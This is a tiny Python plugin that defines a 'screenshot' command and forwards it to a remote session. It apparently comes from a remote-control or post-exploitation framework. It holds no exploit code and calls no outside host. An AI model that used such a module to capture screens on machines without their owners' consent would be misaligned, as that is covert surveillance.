import json
import time
import os
import modules.helper as h


class command:
    def __init__(self):
        self.name = "screenshot"
        self.description = "take a screenshot"
        self.category = "misc"

    def run(self, session, cmd_data):
        result = session.send_command(cmd_data)
        print(result)